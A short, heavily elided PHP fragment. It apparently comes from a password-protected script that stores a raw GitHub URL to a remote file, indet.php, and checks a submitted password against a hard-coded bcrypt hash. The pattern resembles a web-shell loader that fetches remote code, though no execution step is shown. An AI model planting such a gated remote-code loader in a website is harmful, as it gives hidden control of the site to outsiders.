...
if (is_logged_in()) {
    ...
    $destiny = 'https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/indet.php';
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2y$10$JCvkqjXESWjIV1Pp8IplEe3VJhENVO7eplckfouaa2u7heDJnl2hy'; // https://bcrypt.online/
